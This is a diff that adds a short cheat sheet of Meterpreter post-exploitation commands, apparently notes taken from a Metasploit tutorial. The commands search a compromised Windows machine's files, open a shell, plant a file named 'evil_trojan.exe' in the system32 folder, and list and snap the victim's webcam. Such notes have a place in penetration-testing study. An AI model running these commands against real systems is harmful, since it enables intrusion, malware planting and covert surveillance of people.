@@ -1,0 +1,28 @@
+========
+ search
+========
+
+- search -f autoexec.bat
+- search -f sea*.bat c:\\xamp\\
+
+========
+ SHELL
+========
+
+- shell
+
+========
+ UPLOAD
+========
+
+- upload evil_trojan.exe c:\\windows\\system32
+
+========
+ WEBCAM
+========
+
+- webcam_list
+- webcam_snap -h
+-  webcam_snap -i 1 -v false
+
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
